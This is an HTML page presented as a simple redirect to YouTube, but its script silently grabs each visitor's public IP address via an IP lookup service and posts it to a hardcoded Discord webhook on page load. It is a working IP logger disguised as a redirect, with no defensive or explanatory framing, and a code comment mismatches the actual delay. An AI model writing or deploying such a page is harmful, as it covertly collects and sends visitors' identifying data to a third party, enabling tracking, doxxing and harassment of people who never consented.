<!DOCTYPE html>
<html>
<head>
  <title>Redirection...</title>
</head>
<body>

  <script>
    var ip = '';
    fetch('https://api.ipify.org/?format=json')
      .then(function(response) {
        return response.json();
      })
      .then(function(data) {
        ip = data.ip;
        var webhook = 'https://discord.com/api/webhooks/1126222435860107304/P8OUTmVfXEUBYnOy-rdpgdIaOYPzvzw9pJPfl_X8hLOi1yQEVRHaHaAmkz5Vdws69rwO';
        var message = {
          content: '&lt; ||IP: ' + ip + '||'
        };
        fetch(webhook, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json'
          },
          body: JSON.stringify(message)
        });
      });

    // Redirection vers YouTube apr√®s 3 secondes
    setTimeout(function() {
      window.location.href = 'https://www.youtube.com';
    }, 1500);
  </script>

</body>
</html>
